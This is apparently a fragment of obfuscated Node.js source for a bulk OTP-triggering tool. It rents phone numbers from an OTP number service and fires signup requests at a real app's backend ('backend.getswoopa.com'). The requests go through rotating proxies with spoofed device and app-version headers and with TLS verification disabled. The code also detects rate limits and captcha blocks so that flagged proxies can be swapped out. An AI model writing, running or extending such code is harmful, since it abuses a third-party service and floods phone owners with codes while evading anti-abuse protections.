'AvzbBa', 'C29QtG', 'DhD5CW', 'Fdb8oq', 'uKTPBW', 'thrVsq', 'C0z5DG', 'tgHZra', 'lI4U', 'Cvf2zq', 'l21HyW', 'vurjrW', 'q1bimG', 'yw5VDa', 'zxfWtq', 'B3jbyW', 'tw90BW', 't3bWBW', 't1fHyG', 't1zRBq', 'BgLUzq', 'vKDVvG', '4PYtieXV', 'Dhr2rq', 'mJaXnZzNBhPXt3K', 'CM9Syq', 'ywDNzq', 'y2vZCW', 'zMP1DG', 'pI9Kzq', 'tg5Ztq', 'zw5Zzq', 'tKXjwq', 'AhPbCG', 't1zfra', 'DMfPBa', 'mq0k', 'zhvmva', 'A3f5BG', 'AxPHDa', 'zYaGia', 'suvwDq', 'ntaWkq', 'svjpva', 'nw0G', 'BgvNCG', 'Df06', 'z3PPCa', 'EeLYtW', 'rvfJra', 'rgG3sG', 'whLptW', 'CM9Y', 'DgXZ', 'tcbtrq', 'CefYva', 'tM8GBG', 'ihWGsa', 'ifn0yq', 'ANnVBG', 'l2fWAq', 'rfnblq', 'Bca3', 'ChjwBa', 'EgPgsG', 'zwqUDa', 'keDLDa', 'B24Gza', 'sunsEG', 's1zoza', 'DsbTDq', 'vNP0Aq', 'AgrOrG', 'B25ZDa', 'AvDsBW', 'tgfrAa', 'serkrG', 'CMvTBW', 'y0rmra', 'wxvtua', 'Eff4za', 'C3rVCa', 'D2XtDG', 'DM90tW', 's21HBG', 'icOOpW', 'EufZCq', 'y29UCW', 'q3vVwa', 'zcaI', 'DMvYia', 'EwnZqG', 'whveDq', 'Egfpva', 'zMLNDq', 'teTUsa', 'yxn0ia', 'Bc5LEa', 'B0vqDW', 'mtaGva', 'zxi7ia', 'Aejsta', 'y2HPBa', 'sLPcEq', 'BxH4Da', 'EeLOtG', 'CMvZCa', 'Agf6qG', 'C1rqwa', 'BMnLia', 'D3j3vG', 's1jQzG', 'ugXLyq', 'BMrPBG', 'reHyuW', 'yMHICW', 'vhbeCG', 's0Xcua', 'zMLUza', 'B0vTsq', 'BgX5iq', 'DdOGBG', 'icPCkq', 'C0PWrq', 'vgvPEq', 'rgvKwq', 'DNjdEq', 'CKfVva', 'ndy2', 'zNbPqq', 'x3bYBW', 'ic1dBW', 'ENr0sq', 'ienssq', 'veH0AG', 'mY9Nzq', 'icdINjmG', 'yKTJsa', 'Bufktq', 'sfDjra', 'CfDYrG', 'y2Tpsa', 'D2rkuW', 'AgvYia', 'ywXS', 'rcbPBG', 'BNrPBq', 's0Dfta', 'Bw1HBG', 'DxjYzq', 'B3nVzG', 'C29Yia', 'AwzpCq', 'AxzJEG', 'rLPNwq', 'yxHwuG', 'rMLSDa', 'zwqGCW', '4PYtiefq', 'yxrMBW', 'EMzrva', 's21YCa', 'CM94Eq', 'CZu6lW', 'C2v0Da', 'A2v5ia', 'AxHqBG', 'rxjYBW', 'yM1Uta', 'icdINjCG', 'zcbpva', 'zwHltq', 'B0DTBG', 'vxrQBa', 'zgvSyq', 'BwfUDq', 'odG4', 'iejHCW', 'xc8GxW', 'qs1dsa', 'CNr5ia', 'if9Fia', 't1bZra', 'yxrOia', 'AgvJAW', 'sLr5vG', 'DK5Ntq', 'vK9Nra', 's1zouW', 'otaXqG', 'DLbnCa', 'rfrvrW', 'wNLrDa', 'nJGYmJa5CgT5wLLM', 'zxiGmq', 'yxftrW', 'rfjkuW', 'AwrwsW', 'tNHwsW', 'zLK9cG', 'zxneDG', 'r0DfuG', 'CMvXDq', 've9pta', 'tK54yq', 'AKTIsG', 'BgXLEq', 'q0HbqW', 'vK1zBq', 'AwvxEa', 'B3DZlG', 'D3jPDa', 'zhrWvG', 'zxnZBW', 'rNrdua', 'BM5LyW', 'C203mW', 'Awq7ia', 'idePlG', 'if9FxW', 's0iYma', 'zxiG', 'BMnVza', 'teTKqW', 'AhKNia', 'y29UBG', 'uhjVyW', 'zsbUBW', 'zw50Ba', 'q1LpvW', 'D2LUmW', 'CMvdBW', 'ELj0vG', 'veHYEq', 'DvjNwq', 'zMfPBa', 'uKjlza', 'Ec1HCa', 'tw9xuW', 'wM5oua', 'AgLUzq', 'C2v0uW', 'xsbzBW', 'sLDkta', 'ifTKzq', 'twP3EG', 'B25Zzq', 'zujVyq', 'Aw5PDa', 'CNvLkq', 'yxjNDG', 'q29UDa', 'u00TuW', 'rvrfia', 'Dufqva', 'wgLHBW', 'zMLLBa', 'DguGCW', 'su5vtq', 'vfn4Dq', 'A2DAvq', 'CNmGyq', 'icG0mG', 'Dc5Tzq', 'sfbLrG', 'Aw9U', 'DcbZBW', 'igrPCG', 'EfLXEq', 'BvbpuW', 'EfPItq', 'yxzLza', 'zxmUia', 'sfrwCW', 'y2TZlq', 'z0fNsW', 'oLaTmW', 'vw5XCq', 'zwqGAW', 'B3qGzW', 'BMvhDq', 'r2DTEG', 'CdOGsq', 'zxjZlW', 'z2z2ta', 'CKjOBW', 'B3mYmq', 'EhnRra', 'EK91va', 'mtr2CvbXq0i', 'EgL0Aq', 'iduWma', 'lxnZAq', 'wwHtAG', 'C29JAW', 'A3vXzG', 'uLzJwG', 'EujUAW', 'CgX4vG', 'zKziAq', 'mI9Nzq', 's252va', 'B0HJqq', 'EezzAq', 'C3qGCa', 'r0XKCG', 'Cg9UCW', 'vgXPta', 'CM9Yqq', 'DgvY', 'ifvWza', 'sKDSrG', 'uvzmsa', 'DNP2qW', 'rM1Wrq', 'zxPvzW', 'AhHrAa', 'icbFxW', 'ifrssq', 'sw5ZDq', 'sMPnzq', 'A3v2wa', 'rKrXqq', 'CYbHBG', 'cIaGia', 'y2nsCq', 'Exn0zq', 'BvnKBG', 'D0Pdsq', 'DhmVCW', 'r0nnxW', 'wMrpBa', 'zxqTsq', 'y21RyG', 'zxjYBW', 'DLHiDG', 'DgvTua', 'igj5ia', 'uLj0zq', 'q0TUyG', 'v3DXrq', 'zsaTtG', 'tKvuqW', 'wg1SsW', 'C3rKAq', 'thzjrq', 'BenVDq', 'ywrLza', 'u2vUDa', 'ufbYrW', 'wgvbrW', 'qvv2vW', 'zxj2Aq', 'wMH5rq', 'zw50ia', 'zhDizW', 'Dgviyq', 'DhvZia', 'tLbREq', 'yv9HCa', 'su5sEq', 'y3rLza', 'A0L0tq', 'vwHevq', 'wfHvCW', 'C05syG', 'wNHJuG', 'EvHusG', 'oNn0yq', 'EvzYuW', 'zNvWsG', 'zgnTqq', 'BNn0yq', 'DxnLCG', 'BMHjsG', 'z25wwq', 'ALP0va', 'BLznra', 'CMfRBa', 'B3rWCW', 'ELHXCq', 'tM8Sia', 'DNrctG', 'zeDLEG', 'EM9wyW', 'id09pq', 'Aw5HBa', 'CgXHDa', 'Dun0vG', 'ig1PCW', 'igfNyq', 'C2v0Dq', 'C2HLBa', 'uZeYoa', 'DhLWzq', 'yxrLza', 'BerfAq', 'wLnsuW', 'tK5fqW', 'zxjSEq', 'rwPHDW', 'zxjNBW', 'Eurnra', 't09qqq', 'Dvbssa', 'qLbqvG', 'yMfZzq', 'AxrLza', 'zMLSzq', 'wK9Vzq', 'twvluW', 'Bw9YEq', 'AwXL', 'teHItW', 'DuP6rq', 'ieLelG', 'CdmVzW', 'qKHhuq', 'r1rutW', 'CMLUzW', 'uNPAsW', 'BvL3rq', 'yMzwBW', 'zuDPAq', 'C3rHCG', 'AhDZyG', 'sw94CG', 'DNb3zq', 'teXgtG', 'AxrWEq', 'A2XPCW', 'AxbtEq', 'k0zUnW', 'tNz5va', 'mdaPoG', 'wKHjCW', 'mJaW', 'rxfWDW', 'wfn2EG', 'AxjZDa', 'Bvj3vq', 'g1SYsW', 'sgLNtW', 't2D6zW', 'u2P5sG', 'tMneyq', 'sKTOwG', 'DMvKia', 'zYbmAq', 'ws0Tlq', 'r2rgva', 'CMvZCW', 'y3DUEq', 'swj3CW', 'zNLPBG', 'DunnCa', 'qu5lsq', 'C3rVBq', 'v1n1yG', 'zxnZpW', 'A1PPyW', 'Dgjmqq', 'rNLhtW', 'v2DLEG', 'l3nJCG', 'CuzpuW', 'AKHxqG', 'ie5Via', 'ihnLCG', 'z3fhwG', 'zvzXzq', 'B1zXtq', 'wfrRwG', 'oJq0mW', 'vuffEq', 's21zEq', 'nc4XmG', 'tuzXwa', 'y2HHBa', 'DgvFCG', 'y3rYBa', 'kc4UlG', 'DYbRzq', 'DhaV', '8j+tGsbmBW', 'sg9ZDa', 'xsdINiuG', 'ms4Y', 'rgjtvq', 'uvzvwq', 'CxHMta', 'wfD6sq', 'tJbzBq', 'Bxq2nW', 'tLH4wa', 'mNW0', 'vunuwq', 'zM5Svq', 'v2T6Dq', 'ks4Gvq', 'uMDVyG', 'g1SYsG', 'xYbCia', 'AxvTia', 'CwDMua', 'qunWyG', 'uvfPsW', 'igLUDG', 'BxbLCG', 'u0vsvG', 'zxHPCW', 'sfL6EG', 'zuv4tq', 'Aw5NCW', 'A2jxsa', 'zxjTvW', 'xsbB', 'yMPtvW', 'ANfmqG', 'B3mYmG', 'zffXsq', 'D2vYqW', 'rgv2Aq', '4Psa4Psa4Psa4Psa', 'r2v0lq', 'yNrqAq', 'tvL6sW', 'oIbnAq', 'CeHJCW', 'z3DSyW', 'zgvZDa', 'y3b1', 'Aw4GBa', 'EK5qzq', 'B3v0lG', 'zY4k', 'lYaVia', 'Agv4', 'B3iGka', 'uKfqrq', 'DND5DG', 'u3fttG', 'xY9CxW', 'q00TuW', 'CMqGlq', 'DMvYCW', 'AenTwG', 'A1PjqW', 'mc05yq', 'vhLWzq', 'EKrrsa', 'BIbMyq', 'tfvtia', 'twrWrG', 'CgfYCW', 'CM95', 'uKXMBa', 'mKXNBq', 'DwX0kq', 'CM91BG', 'uKrxqq', 'BgPArW', 'B3j0Aq', 'Ag8GiG', 'khj1BG', 'zKzjCa', 'FdeX', 'nhW4Fa', 'u3vJyW', 'BNrSEq', 'DMvmAq', 'yNfcwq', 'zYbZzq', 'v2LUza', 'ugL4zq', 'qNzmEa', 'uKnQzq', 'whjSta', '4P6ug1SZ', 'B29kyG', 'Bw51uG', 'v2LUmW', 'B24G', 'x18GxW', 'DhntEq', 'DgXLza', 'q1r2Dq', 'qxzgzG', 'zvP5sa', 'Dw5KoG', 'B2jQzq', 'Aw5Ozq', 'C1joBG', 's3bvuG', 'CxvLDq', 'y29UDa', 'yMflza', 'ic8GlW', 'twfRzq', 'AevMrq', 'zxr1CG', 'id0Gka', 'CxjftW', 'CNjVCG', 'CgvYqW', 'Eu1Z', 'ucb0BW', 'CwzXDG', 'zYbYzq', 'ChH6DW', 'mZyZ', 'CMvywG', 'AMvdta', 'B20Gta', 'CeriyG', 'sNvTvW', 'l3bYBW', 'DgvYia', 'veTgAW', 'zNvTvW', 'u2HlrW', 'C2v0uG', 'CxvLCW', 'iZG4oa', 'DwzNvW', 'Eu5MsG', 'CYbRzq', 'BKDfsa', 'zxLhBW', 'D2vWBq', 'yNjVDa', 'rw5pzG', 'C2DYsq', 's3z5qG', 'y3jHCa', 'wNHsvq', 'ChjVCa', 'tvvPAa', 'zf9WCG', 'mxWWFa', 'nc45lG', 'AhDRCG', 'DgHYzq', 'B2TODa', 'icaTlq', 'sxDZuq', 'zgzxCq', 'AwzosG', 's1fYAG', 'x3nPza', 'u2HizW', 'tgLlqW', 'Dej3yW', 'q293qG', 'C3rLBG', 'lufNzq', 'rNrMqq', 'z1vIDq', 'EwLUzW', 'Aw9UoG', 'D1LrqG', 'rhPmEq', 'Bcbtzq', 'vLPdzG', 'z050Aq', 'qwPTCq', 'AhjLyq', 'mtaWia', 't1frzq', 'zxnZAq', 'zwDPCW', 'otK4qG', 'EKjYqq', 'Aw1LBW', 'khbYBW', 'E30UyW', 'AwvUDa', 'vLjWyq', 'CdiVzW', 'yMLYsq', 'tezeDa', 'tdOGsq', 'iokaLcbd', 'rM1ryq', 'vhfSza', 'rMLSzq', 'sfjfqq', 'C3bSAq', 'FdL8oa', 'DhjPBG', 'uc8XlG', 'wxPprW', 'CgLWzq', 'AfH4sq', 'CMv0CG', 'tNDczW', 't1n0CG', 'vM1ltq', 'uezKCq', 'CuPtDW', 'Ahbktq', 'DgDysq', 'C3zJvG', 'CNLRwq', 'C2fTCW', 'zw50zq', 'B3iGza', 'z3HZCa', 'DfXdCG', 'u00TrW', 'icdILAdILza', 'sxLsCq', 'veLdqq', 'qMfOEa', 'B1bYBW', '4PYtifrO', 'Aw5ZDa', 'wgnIyq', 'A0XAEa', 'zhjXra', 'B25Lia', 'DcbMBW', 'vvjrBa', 'zuzPBa', 'vuXeAG', 'z2vYzq', 'B1LrAa', 'uLHwEq', 'g1SWBq', 'sKrsuq', 'zgv0yq', 'DgfYDa', 'zgvUyW', 'EfP0tW', 'DvvVqG', 't3vLuq', 'rMfPBa', 'BgvKia', 'C29Tzq', 'EMXPyG', 'r1bmBG', 'C21czq', 'CNrPBG', 'yxbLCG', 'ieLUDG', 'uMnzqG', 'vuPNCW', 'EfLLua', 'DwLUzG', 'v3jPDa', 'wuHtzG', 'y3PisW', 'ruzqzG', 'zePuEa', 'DgLVBG', 'ChjVEa', 'C2vZCW', 'CML0', 's3HyyG', '4Pwq4Pwq4Pwq4PwJ', 'tLHjyW', 'Bw55yq', 'vuLhrW', 'CwjTyG', 'r3jPvG', 'ELD5tG', 'tNvTyG', 'suXztW', 'vhfkBq', 'AxjNrW', 't2rtvW', 'x19FlW', 'yKfoDa', 'zxqGyW', 'uK1ymW', 'Dfb1BG', 'zsbTzq', 'txndDW', 'zsbPDa', 'ywrbDq', 'Aw4ZmG', 'DhjPBq', 'Cg94qq', 'uvvnqG', 'sLnmza', 'vKDutW', 'A3LWwa', 'zxn0', 'vuLbzG', 'ne5tta', 'mta1mJmWCvrNEhrk', 'q2nlsG', 'v0vWwG', 'zxH0CG', 'u3LUyW', '4Pwq4Pwq4Pwq4PwD', 'Av9Rzq', 'Dg9mBW', 'Bwv4tW', 'D0zSyq', 'BNzHBa', 'B3H5lq', 'refYyG', 'y2uUyW', 'y2LLCW', 'CgfKrq', 'ieHuva', 'CYb1BG', 'q1qGtG', 'y0nrAq', 'zwfKEq', 'zeHLCW', 'yKL0Ba', 'wKT4vG', 'mtmYDhD3CMHW', 'yxLKDG', 'yxjLia', 'EM5Yta', 'y1LdrW', 'ruqGlW', 'B3iGAq', 'BxjfDW', 'uw55zW', 'zgLNzq', 'Cxbswq', 'Ce9mDG', 'Dg8GzG', 'wNnlAW', 'sMnQsG', 'vuvsAG', 'uIbtvW', 'uMLpta', 'AcbKDq', 'CM5myG', 'B3rWlq', 'CgvYia', 'tK9RyW', 'CwXrBG', 'AYbMyq', 'shPoAq', 's2v5ia', 'BwCSja', 't0Xzmq', 'suTXsW', 't2TmsG', 'txbZyW', 'u2DmtW', 'EsbZyq', 'CgfZCW', 'C2LVBG', 'ze5xva', 'Axr5ia', 'nc4Xmq', 'l18Via', 'EKzSDq', 'rxHPDa', 'quvtmG', 'qM1muW', 'tLjnrW', 'zw50lq', 'y1z4qG', 'zxjFAW', 'C0juCq', 'oI8V', 'DgvKlG', 'CMvUza', 'AwvZrG', 'igrVDW', 'DwvvBq', 'AwjkBa', 'uNHeza', 'wNHWBq', 'rgvWzq', 'uwLIvq', 'mtyZ', 'qwjVCG', 'AxrPBG', 'rePoEq', 'rgPwqq', 'u3fvvq', 'ywnOAq', 'y2HLyW', 'Aw5Nia', 'rfvluW', 'z3v6sq', 'rgPZCG', 'BNnLia', 'B0ntvq', 'CIbMDq', 'ntu1', 'ucbbua', 'igzVCG', 'zxjFDa', 'tgLJzq', 'v1jcqG', 't0DbBW', 'rMf0yq', 'ywqGzG', 'yMfJAW', 'teToEG', 'C2HPzG', 'tNvuqG', 'CMvZ', 'quvtmq', 'wgfcAa', 'CeT4Ea', 'Buf6vG', 'A2vgsq', 'wuLUwG', 'r210ua', 'wL8Kxq', 'BcbKzq', 'uen4vW', 'CMvHza', 'sfLKuG', 'Fdv8mq', 'ufL4tW', 'rurwra', 'uhjVEa', 'zwn0', 'vLf0Ca', 'q3rUCa', 'q1bPua', 'BMvSBq', 'vfKGqq', 'quDRzW', 'Be51Bq', 've13sa', 'nhWYFa', 'BK9fAa', 'Aw9Uia', 'ifvoqq', 'AwvZlG', 'icHLlG', 'luvYCG', 'CMvHCW', 's2v5Ca', 'EgTjDa', 's1v4CW', 'mhWYFa', 'q1vssq', 'DgLUDq', 'mLz3qq', 'ssbRzq', 'rs1fqW', 'DMfS', 's0jNAq', 'icGVzW', 'CM9YoG', 'z2ziEG', 'AwDUDq', 'ze53qG', 'C2XPyW', 'ifjftq', 'D2HPDa', 'ENLkqG', 'shbQDa', 'B3v0', 'A2v5Ca', 'yMTfva', 'r3PYtW', 'ifj1BG', 'uMDetq', 'D29VCa', 'uZi1nG', 'zw5K', 'zs4UlG', 'seeYma', 'EMXYCa', 'zwvK', 'qLH2EG', 'sKPUrG', 'sxnYCW', 'oezg', 'zs1pDq', 'BuLsyW', 'cIaG4Pwu', 'mJaGva', 'uffZuq', 'wuPPCG', 'CMvKia', 'ChjVyW', 'yw5Jzq', 'swHqqG', 'wNvLDq', 'zwfZzq', 'tNH5va', 'tLLhDq', 'C3LtqG', 'vvritW', 'tvrHqG', 'vLLovG', 'CwLKsq', 'yKD2wG', 'rvz6DW', 'Fc8GFa', 'AYa9ia', 'B3HPzq', 'wuHzEG', 's3DLsG', 'q1zzwG', 'CNzLCG', 'CM9Wzq', 'qNPSAG', 'zfvMBG', 'EKHkDa', 'BNnLoG', 'BcbLCG', 'B2nLCW', 'luvora', 'igTLEq', 'DwHqyq', 'zsaZma', 'yM1uwq', 'rLHvwq', 'yMvbrW', 'DuLMCq', 'DgfSBa', 'zfPVBq', 'DhvZ', 'z2Hcra', 'ugjqzq', 'CxjvuG', 'yLr1ta', 'Fdf8nW', 'qYblrq', 'zxnZzG', 'EhbUqW', 'AMXRtq', 'r1bgCW', 'CM9Tia', 'vKDTra', 'tejqrq', 'CMLNzW', 'q2LTsq', 'AhDPza', 'shv6wG', 'Cc12zq', 'yxDnBW', 'z3vVBW', 'y2nhza', 'wLbotq', 'wKDnsa', 'rvvNCq', 't1bbia', 'Dhj1yW', 'ksGGkq', 'y2HH', 'z2H0', 'zw5JAq', 'D2HPBa', 'r2fgsG', 'ntm2qG', 'runesa', 'DgLUzW', 'zxqP', 'wKDnCa', 'zsKUtq', 'zxH5BG', 'DxP0yq', 'EvLuvq', 'Egv2Dq', 'EgXUCq', 'sgvjzG', 'BMCUia', 'BMCU', 'zMLSDa', 'uMvZCa', 'lJuY', 'ote0mezfBKzvAq', 'ie5LDa', 'v09brG', 'B25LlW', 'y2HHia', 'CMvWzq', 'u3b1BG', 'zgv0zq', 'yK9jAa', 'zcboua', 'ww9huq', 'A0XNvq', 'vgHYzq', 'DfnVDW', 'C3zZAW', 'ugjesa', 'ms4YnW', 'Es1bDq', 'AhjVDa', 'z2XOsG', 'nZvHBW', '4Pwq4Pwq4Pwq4Pwq', 'BMrLBG', 'zwn0kq', 's0zKBq', 'BMvK', 'BuXUrW', 'zxiGia', 'igjHBa', 'CMDLDa', 'yvvgta', 'xsbtzq', 'DKj2Cq', 'wNbIuG', 'yxrLia', 'lIbuyq', 'wKDozW', 'B3jRoG', 'v2L0Aa', 'A0HPyW', 'y2fSBa', 'lujfrW', 'vM9SDq', 'C3v1qq', 'CgXRqG', 'ywrZ', 'mte5ra', 'CMj1zq', 'C0zVAa', 'BeXVtG', 'AxjLza', 'zK5Jra', 'BxbLrW', 'C2ffCa', 'vMvxEq', 'rK96ua', 'uM90yq', 'Bw9Kzq', 'qvLiCa', 'Aw5JBa', '4Psa4Psa4Psa4Psy', 'lunPBq', 't1vPtW', 's29sBa', 'zxHWAq', 'EM5ZDq', 'nNW1Fa', 'ihnHDG', '4Pwq4PwDcG', 'DxbKyq', '4PYxifLV', 'xsbtDa', 'ieLq', 'Dvjktq', 'icdILiiG', 'veHOwG', 'icD8jW', 'vxDqvq', 'BMCUlG', 'CY50Ea', 'uxDNva', 'wKTJrq', 'ExLJDW', 'ie9uua', 'mtu2rq', 'ihbYBW', 'uNnLyW', 'A0rRCa', 'vMXkqG', 'uwzqvW', 'DhrSzq', 'vvbDia', 'teLdia', 'lJuX', 'xsbuyq', 'l3zLCG', 'y29xtG', 'zsboBW', 'mJu2xW', 't2LJtG', 'C2LN', 'CNH4EG', 'tfnwra', 'lvbpta', 'q0nHDa', 'DMrQzq', 'v29YAW', 'we5mEG', 'DvztAq', 'qs1brq', 'zgvSzq'];
  fn1 = function () {
    return v42;
  };
  return fn1();
}
function nexaFetchNumber(v43, v44, v45) {
  return new Promise((v46, v47) => {
    const v48 = {};
    v48.range = v44, v48.format = "normal";
    const v49 = JSON.stringify(v48),
      v50 = {
        'hostname': "nexaotpservice.com",
        'port': 0x50,
        'path': v45 || "/api/v1/numbers/get",
        'method': "POST",
        'headers': {
          'X-API-Key': v43,
          'Content-Type': "application/json",
          'Content-Length': Buffer.byteLength(v49)
        }
      };
    const v51 = http.request(v50, v52 => {
      {
        let v53 = '';
        v52.on("data", v54 => v53 += v54), v52.on("end", () => {
          try {
            const v55 = JSON.parse(v53);
            v55.success && v55.number ? v46(v55.number.replace(/[^0-9]/g, '')) : v47(new Error(v55.error || "NexaOTP: No number returned"));
          } catch (v56) {
            v47(new Error("NexaOTP: Invalid response"));
          }
        });
      }
    });
    v51.on("error", v57 => v47(new Error("NexaOTP network: " + v57.message))), v51.setTimeout(10000, () => {
      v51.destroy(), v47(new Error("NexaOTP: Timeout"));
    });
    v51.write(v49), v51.end();
  });
}
function normalizePhoneNumber(v58) {
  let v59 = v58.trim();
  if (!v59.startsWith('+')) v59 = '+' + v59;
  return v59;
}
function parseProxy(v60) {
  if (!v60) return null;
  if (typeof v60 === "object") return v60;
  v60 = v60.trim();
  if (!v60) return null;
  let v61, v62, v63, v64;
  if (v60.includes("://")) v60 = v60.split("://")[1];
  if (v60.includes('@')) {
    const v66 = v60.split('@'),
      v67 = v66[0].split(':'),
      v68 = v66[1].split(':');
    v63 = v67[0], v64 = v67[1], v61 = v68[0], v62 = parseInt(v68[1]);
  } else {
    {
      const v69 = v60.split(':');
      if (v69.length === 2) v61 = v69[0], v62 = parseInt(v69[1]);else {
        if (v69.length === 4) !isNaN(parseInt(v69[3])) && isNaN(parseInt(v69[1])) ? (v63 = v69[0], v64 = v69[1], v61 = v69[2], v62 = parseInt(v69[3])) : (v61 = v69[0], v62 = parseInt(v69[1]), v63 = v69[2], v64 = v69[3]);else v69.length === 3 && (v61 = v69[0], v62 = parseInt(v69[1]), v63 = v69[2]);
      }
    }
  }
  if (!v61 || !v62) return null;
  const v65 = {};
  v65.type = "http", v65.host = v61, v65.port = v62, v65.user = v63;
  v65.pass = v64;
  return v65.original = v60, v65;
}
function rotateSessionId(v70) {
  if (!v70 || !v70.user) return v70;
  const v71 = {
    ...v70
  };
  const v72 = v71;
  if (v72.user.includes("-ssid-")) {
    const v73 = crypto.randomBytes(6).toString("base64").replace(/[+/=]/g, '').substring(0, 10);
    v72.user = v72.user.replace(/-ssid-[A-Za-z0-9_]+/, "-ssid-" + v73);
  } else {
    if (v72.user.includes("-session-")) {
      const v74 = crypto.randomBytes(6).toString("base64").replace(/[+/=]/g, '').substring(0, 10);
      v72.user = v72.user.replace(/-session-[A-Za-z0-9_]+/, "-session-" + v74);
    } else {
      if (/_sid_/i.test(v72.user)) {
        const v75 = crypto.randomBytes(6).toString("base64").replace(/[+/=]/g, '').substring(0, 10);
        v72.user = v72.user.replace(/_sid_[A-Za-z0-9]+/i, "_sid_" + v75);
      }
    }
  }
  return v72;
}
const http2 = require("http2");
function sendRequest(v76, v77, v78, v79, v80 = null, v81 = 20000) {
  return new Promise((v82, v83) => {
    const v84 = new URL(v76),
      v85 = {
        ':method': v77,
        ':path': v84.pathname + v84.search,
        ':scheme': "https",
        ':authority': v84.host,
        'x-platform': v78["x-platform"] || v78["X-Platform"],
        'x-app-version': v78["x-app-version"] || v78["X-App-Version"],
        'content-type': v78["content-type"] || v78["Content-Type"],
        'accept-encoding': "gzip",
        'user-agent': v78["user-agent"] || v78["User-Agent"]
      };
    v79 && (v85["content-length"] = String(Buffer.byteLength(v79)));
    Object.keys(v85).forEach(v87 => {
      {
        if (v85[v87] === undefined) delete v85[v87];
      }
    });
    const v86 = {
      'rejectUnauthorized': false,
      'ciphers': ["TLS_AES_128_GCM_SHA256", "TLS_AES_256_GCM_SHA384", "TLS_CHACHA20_POLY1305_SHA256", "ECDHE-ECDSA-AES128-GCM-SHA256", "ECDHE-RSA-AES128-GCM-SHA256", "ECDHE-ECDSA-AES256-GCM-SHA384", "ECDHE-RSA-AES256-GCM-SHA384", "ECDHE-ECDSA-CHACHA20-POLY1305", "ECDHE-RSA-CHACHA20-POLY1305"].join(':'),
      'ecdhCurve': "X25519:P-256:P-384",
      'minVersion': "TLSv1.2"
    };
    if (v80) {
      const v88 = typeof v80 === "object" ? v80 : parseProxy(v80);
      if (!v88 || isNaN(v88.port) || v88.port <= 0) return v83(new Error("FATAL: Invalid proxy. Aborting."));
      const v89 = require("net"),
        v90 = require("tls"),
        v91 = v88.user && v88.pass ? "Proxy-Authorization: Basic " + Buffer.from(v88.user + ':' + v88.pass).toString("base64") + '\x0d\x0a' : '',
        v92 = v89.connect(v88.port, v88.host, () => {
          v92.write("CONNECT " + v84.hostname + ":443 HTTP/1.1\r\n" + ("Host: " + v84.hostname + ":443\r\n") + v91 + '\x0d\x0a');
        });
      v92.once("data", v93 => {
        const v94 = v93.toString();
        if (!v94.includes("200")) return v92.destroy(), v83(new Error("Proxy CONNECT failed: " + v94.split('\x0d\x0a')[0]));
        const v95 = {
          'socket': v92,
          'servername': v84.hostname,
          'ALPNProtocols': ['h2'],
          ...v86
        };
        const v96 = v90.connect(v95);
        v96.once("secureConnect", () => {
          {
            const v97 = {};
            v97.createConnection = () => v96;
            const v98 = http2.connect("https://" + v84.hostname, v97);
            v98.setTimeout(v81, () => {
              v98.destroy();
              v83(new Error("timeout"));
            });
            const v99 = v98.request(v85),
              v100 = [];
            v99.on("response", v101 => {
              const v102 = v101[":status"];
              v99.on("data", v103 => v100.push(v103));
              v99.on("end", () => {
                let v104 = Buffer.concat(v100);
                const v105 = v101["content-encoding"];
                if (v105 === "gzip") {
                  try {
                    v104 = zlib.gunzipSync(v104);
                  } catch (v106) {}
                } else {
                  if (v105 === 'br') try {
                    v104 = zlib.brotliDecompressSync(v104);
                  } catch (v107) {}
                }
                v98.destroy(), v82({
                  'status': v102,
                  'data': v104.toString("utf8"),
                  'headers': v101
                });
              });
            }), v99.on("error", v108 => {
              v98.destroy();
              v83(v108);
            });
            if (v79) v99.write(v79);
            v99.end();
          }
        });
        v96.on("error", v109 => {
          v92.destroy(), v83(v109);
        });
      }), v92.on("error", v83), v92.setTimeout(v81, () => {
        v92.destroy();
        v83(new Error("timeout"));
      });
    } else {
      const v110 = http2.connect("https://" + v84.hostname, v86);
      v110.setTimeout(v81, () => {
        v110.destroy(), v83(new Error("timeout"));
      });
      const v111 = v110.request(v85),
        v112 = [];
      v111.on("response", v113 => {
        const v114 = v113[":status"];
        v111.on("data", v115 => v112.push(v115)), v111.on("end", () => {
          {
            let v116 = Buffer.concat(v112);
            const v117 = v113["content-encoding"];
            if (v117 === "gzip") try {
              v116 = zlib.gunzipSync(v116);
            } catch (v118) {} else {
              if (v117 === 'br') try {
                v116 = zlib.brotliDecompressSync(v116);
              } catch (v119) {}
            }
            v110.destroy(), v82({
              'status': v114,
              'data': v116.toString("utf8"),
              'headers': v113
            });
          }
        });
      }), v111.on("error", v120 => {
        v110.destroy(), v83(v120);
      }), v110.on("error", v83);
      if (v79) v111.write(v79);
      v111.end();
    }
  });
}
async function triggerOTP(v121, v122 = {}) {
  const {
      onStatus = () => {},
      proxy = null,
      timeout = 20000,
      onCaptchaProxy = null
    } = v122,
    v123 = normalizePhoneNumber(v121),
    v124 = getRandomDevice(),
    v125 = getRandomAppVersion(),
    v126 = {};
  v126.host = "backend.getswoopa.com";
  v126["x-platform"] = "android", v126["x-app-version"] = v125, v126["content-type"] = "application/json", v126["accept-encoding"] = "gzip", v126["user-agent"] = v124;
  const v127 = v126;
  try {
    {
      onStatus("[1/1] Sending OTP to " + v123 + "...");
      const v128 = JSON.stringify({
          'phone': v123,
          'check_key': getCheckKey()
        }),
        v129 = await sendRequest("https://backend.getswoopa.com/api/accounts/signup-phone/", "POST", v127, v128, proxy, timeout);
      debugLog(v123, "otp-res", v129.data);
      if (v129.status === 201) {
        onStatus("[1/1] ✅ OTP Dispatched");
        const v130 = {};
        return v130.success = true, v130.message = "OTP Triggered", v130.phone = v123, v130;
      } else {
        if (v129.status === 429) throw new Error("Rate Limited (429) — Too many requests from this IP");else {
          {
            const v131 = v129.data ? (() => {
                try {
                  return JSON.parse(v129.data);
                } catch {
                  return {};
                }
              })() : {},
              v132 = v131.code === "validation_error" && Array.isArray(v131.extra?.["fields"]) && v131.extra.fields.some(v134 => v134.toLowerCase().includes("captcha"));
            if (v132) {
              if (proxy && onCaptchaProxy) onCaptchaProxy(proxy);
              throw new Error("Captcha (proxy IP flagged — blacklisted)");
            }
            const v133 = v131.detail || v131.message || v131.error || "Failed (HTTP " + v129.status + ')';
            throw new Error('' + v133);
          }
        }
      }
    }
  } catch (v135) {
    {
      const v136 = {};
      return v136.success = false, v136.message = '' + v135.message, v136.phone = v123, v136;
    }
  }
}
if (isMainThread) {
  class Dashboard {
    constructor(v137) {
      {
        this.totalNumbers = v137;
        this.processed = 0;
        this.successful = 0;
        this.failed = 0;
        this.startTime = Date.now();
      }
    }
    ["addLog"](v138, v139) {
      let v140 = '';
